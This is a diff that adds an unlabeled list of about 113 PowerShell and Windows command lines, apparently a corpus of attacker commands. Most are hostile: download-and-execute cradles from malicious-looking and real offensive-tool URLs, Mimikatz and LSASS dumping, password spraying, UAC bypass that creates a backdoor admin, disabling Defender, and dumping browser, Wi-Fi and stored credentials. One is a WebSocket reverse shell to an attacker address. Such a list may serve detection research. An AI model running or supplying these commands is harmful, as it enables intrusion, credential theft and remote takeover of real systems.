@@ -1,0 +1,113 @@
+Invoke-Expression (Invoke-WebRequest -Url 'http://exploiting-site.com/sospiciousFile.ps1'.Content)
+powershell.exe -nop -w hidden -c "IEX ((New-Object Net.WebClient).DownloadString('http://maliciousurl.com/maliciousscript.ps1'))";
+get-localgroup ; Get-LocalGroupMember -Name "Administrators"
+powershell.exe -Command "Invoke-Mimikatz"
+powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://example.it/exWin64.ps1')"
+powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://ghithub.com/badProject.ps1')"
+powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://GitExample.com/maliciouscode.ps1')"
+powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://webSiteExample.com/danger.ps1')"
+Get-BrowserInformation -Browser All -Datatype History -UserName Charlie -Search 'republica'
+Get-LAPSPasswords -DomainController 192.168.1.1 -Credential demo.com\administrator | Format-Table -AutoSize
+Invoke-RIDHijacking -UseGuest -RID 1001
+powershell.exe -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://website.com/malicious-script.ps1')"
+powershell -executionpolicy bypass -command ${file_path}\Get-Inbox.ps1 -file ${output_file}
+$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path ${input} -Encoding Byte -ReadCount 1024) { $ping.Send("${IPaddress}", 1500, $Data) }
+$imewdbled = $env:SystemRoot + "\System32\IME\SHARED\IMEWDBLD.exe" ; & $imewdbled ${rem_URL}
+Import-Module .\powerview.ps1 -Force; ; Get-NetDomain | ConvertTo-Json -Depth 1
+certutil -addstore my ${pfx_path}
+import-module "$env:temp\MSOLSpray.ps1" ; Invoke-MSOLSpray -UserList "${user_list}" -Password "${password}"
+Invoke-Expression -Command (New-Object Net.WebClient).DownloadString('http://malware-server.com/rootFile.ps1')
+Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=${uacProp})' -Server ${dmn}
+Get-Process lsass | Out-Minidump
+copy-item -Path "\${remote}\C$${share_file}" -Destination "$Env:TEMP${local_file}"
+tasklist /m >> $env:APPDATA\vmtool.log; ; cat $env:APPDATA\vmtool.log
+powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1')"
+wmic.exe group get name
+powershell.exe -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')"
+findstr /si pass *.xml *.doc *.txt .xls ; ls -R | select-string -ErrorAction SilentlyContinue -Pattern password
+Start-Process ${powershell_command}
+evil-winrm -i ${destAddress} -u ${Username} -p ${Password}
+evil-winrm -i ${destination_address} -u ${user_name} -p ${password}
+$code = 'IEX (New-Object Net.WebClient).DownloadString("http://malicious-server.com/malicious-script.ps1")';Invoke-Expression -Command $code
+$Process = Start-Process -FilePath "powershell.exe" -ArgumentList "-command {IEX (New-Object Net.WebClient).DownloadString('http://malicious.site')}"
+powershell.exe -ExecutionPolicy Bypass -NoProfile -File template.ps1
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command "IEX (Invoke-WebRequest -Uri 'http://evil.url/evil.ps1').Content"
+New-Item -Path "." -Name "staged" -ItemType "directory" -Force | foreach {$_.FullName} | Select-Object
+Get-System -Technique Token
+Out-Minidump -Process (Get-Process -Id 4293)
+Invoke-Expression -Command "& {Invoke-WebRequest http://malicious.site/malicious.ps1 | Invoke-Expression}"
+Invoke-Shellcode -Shellcode @(0xE9,0x90,0xC3)
+Start-ATHProcessUnderSpecificParent -FilePath ${file_path} -CommandLine '${command_line}' -ParentId ${parent_pid}
+Get-Date
+$ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -OnIdle
+Send-MailMessage -From ${Sender_User} -To ${Receiver} -Subject 'T1027_Atomic_Test' -Attachments ${inFile} -SmtpServer ${smtpServer}
+Invoke-Inveigh -IP 192.168.1.10 -SpooferIP 192.168.2.50 -HTTP N
+Add-Content ${PsProfile} -Value "" ; Add-Content ${PsProfile} -Value "Start-Process ${path_exec}" ; powershell -Command exit
+(New-Object Net.WebClient).DownloadString('${target_remote_file}') | Out-File ${output_file}; Invoke-Item ${output_file}
+cmd /c "for /l %x in (1,1,${max}) do start wordpad.exe /p ${filePrint}" | out-null
+Import-Module .\Inveigh.psd1;Invoke-Inveigh
+.\totallylegit.exe ${host.process.id} C:\Users\Public\creds.dmp
+$cmd = 'C:\Windows\System32\cmd.exe /c calc.exe'; Invoke-Expression -Command $cmd
+Invoke-Command -ComputerName <target_system> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('<malicious_script_url>')}
+Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt
+Write-Host "STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON" -fore green ; Import-Module "$Env:Temp\PowerDump.ps1" ; Invoke-PowerDump
+$ScriptBlockLogging = $true; $LogCommandHealthEvent = $true; $LogScriptBlockInvocation = $true;
+Import-Module .\powerview.ps1; ; Get-NetLocalGroupMember -ComputerName ${remote.host.fqdn}
+cscript ${VBscript} > $env:TEMP\T1059.005_tec.out.txt
+$notepad = Start-Process notepad -passthru ; Start-Process $PathToAtomicsFolder\T1055\bin\x64\InjectView.exe
+Invoke-WebRequest -Uri ${ip_address} -Method POST -Body ${input_file}
+cd $env:temp ; .\kerbrute.exe userenum -d ${Dmn} --dc ${DomainC} $env:TEMP\username.txt
+Invoke-BypassUAC -Command 'net user backdoor Password123! /add && net localgroup administrators backdoor /add' -Verbose
+. ${gpp_script_path} ; Get-GPPPassword -Verbose
+powershell.exe -e [base64 encode d command]
+Invoke-Command -ComputerName <RemoteComputerName> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://ForzaNapoli.com')}
+sleep 100
+powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://some.example.com/malicious.ps1');"
+$Process = Start-Process -FilePath "C:\Windows\System32\cmd.exe" -ArgumentList "/c powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://evil.url/evil.ps1')"
+.\wifi.ps1 -Pref
+Get-System -WhoAmI
+Get-BrowserInformation -Browser All -Datatype History -UserName user1 -Search 'github'
+Invoke-Expression -Command "IEX (New-Object Net.WebClient).DownloadString('http://danger.example-server.com/exploitSys.ps1')"
+Get-GPPPassword | ForEach-Object {$_.passwords} | Sort-Object -Uniq
+powershell.exe -WindowStyle Hidden -Command "Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://evilexample-site.com/sospicious_code')"
+cmd /c '${gpgExeLocation}' -c '${FileLocation}'
+cd $env:temp ; .\kerbrute.exe userenum -d ${Domain} --dc ${domain_control} $env:TEMP\username.txt
+odbcconf.exe /S /A {REGSVR "C:\Users\Public\sandcat.dll"}
+(gwmi -list win32_shadowcopy).Create('${drive_letter}','ClientAccessible')
+Import-Module .\PowerView.ps1 -Force; ; Get-NetComputer
+${mofcomp_path} ${mof_file}
+Get-Service > $env:TEMP\T1119_1.txt ; Get-ChildItem Env: > $env:TEMP\T1119_2.txt ; Get-Process > $env:TEMP\T1119_3.txt
+nbtstat -A ${rem.host.IP}
+New-ItemProperty -Path "HKLM:\Software\Microsoft\Command Processor" -Name "AutoRun" -Value "${command}" -PropertyType "String"
+Invoke-Command -ComputerName <Target_IP> -ScriptBlock {powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command <Evil_Script>}
+IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing)
+Invoke-RIDHijacking -User alice -RID 500 -Password Password1
+Invoke-Command -ComputerName <target_ip> -ScriptBlock { <malicious_code> }
+Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs
+$credman = New-Object -TypeName PSCredentialManager.Credential; $credman | Where-Object { $_.Type -eq 'Generic' } | Select-Object -Property UserName, Password
+Set-SeBackupPrivilege ; Get-SeBackupPrivilege
+Get-ForestDomain
+Get-WmiObject -Class Win32_OperatingSystem | Select-Object -Property *
+/GMSAPasswordReader --AccountName jkohler
+Get-RemoteMachineAccountHash -ComputerName < remotehost> -Verbose
+Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
+bloodhound-python -u support -p 'BlackKnight' -ns 10.10.10.192 -d blackfield.local -c all
+Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose
+Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
+Remove-Module PSReadline
+$watcher = New-Object System.IO.FileSystemWatcher; $watcher.Path = 'C:\'; $watcher.IncludeSubdirectories = $true; $watcher.EnableRaisingEvents = $true; Register-ObjectEvent $watcher 'Created' -Action { Write-Host 'File Created: ' $Event.SourceEventArgs.FullPath }
+sqlEXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
+Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'SELECT * FROM OPENQUERY("sql2.domain.io", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'
+Get-SQLServerLink -Instance dcorp-mssql -Verbose
+Get-ScheduledTask | Where-Object {$_.Principal.UserId -notlike 'S-1-5-18'} | Select-Object TaskName, TaskPath, Principal
+Set-MpPreference -DisableRealtimeMonitoring $true
+Invoke-WebBrowserPasswordDump | Out-File -FilePath C:\temp\browser_passwords.txt
+Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | select __Namespace | sort __Namespace
+$env:USERPROFILE + '\AppData\Local\Google\Chrome\User Data\Default\Cookies' | Get-Item
+$ClientWebSocket = New-Object System.Net.WebSockets.ClientWebSocket; $uri = New-Object System.Uri("ws://attacker_ip:attacker_port"); $ClientWebSocket.ConnectAsync($uri, $null).Result; $buffer = New-Object Byte[] 1024; while ($ClientWebSocket.State -eq 'Open') { $received = $ClientWebSocket.ReceiveAsync($buffer, $null).Result; $command = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $received.Count); $output = iex $command 2>&1 | Out-String; $bytesToSend = [System.Text.Encoding]::ASCII.GetBytes($output); $ClientWebSocket.SendAsync($bytesToSend, 'Binary', $true, $null).Wait() }
+Get-StoredCredential | % { write-host -NoNewLine $_.username; write-host -NoNewLine ":" ; $p = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($_.password) ; [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($p); }
+Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query "exec master..xp_cmdshell 'whoami'"
+Import-Module PSPKI ; Get-CertificationAuthority -ComputerName dc.theshire.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest
+Restart-Service WinRM
+netsh wlan show profiles | Select-String -Pattern 'All User Profile' -AllMatches | ForEach-Object { $_ -replace 'All User Profile *: ', '' } | ForEach-Object { netsh wlan show profile name="$_" key=clear }
+Add-Type -TypeDefinition @" using System; using System.Drawing; using System.Runtime.InteropServices; public class ScreenCapture { [DllImport("user32.dll")] public static extern IntPtr GetDesktopWindow(); [DllImport("user32.dll")] public static extern IntPtr GetWindowDC(IntPtr hWnd); [DllImport("gdi32.dll")] public static extern bool BitBlt(IntPtr hObject, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hObjectSource, int nXSrc, int nYSrc, int dwRop); } "@ $desktop = [ScreenCapture]::GetDesktopWindow() $dc = [ScreenCapture]::GetWindowDC($desktop) # Further code to perform screen capture goes here
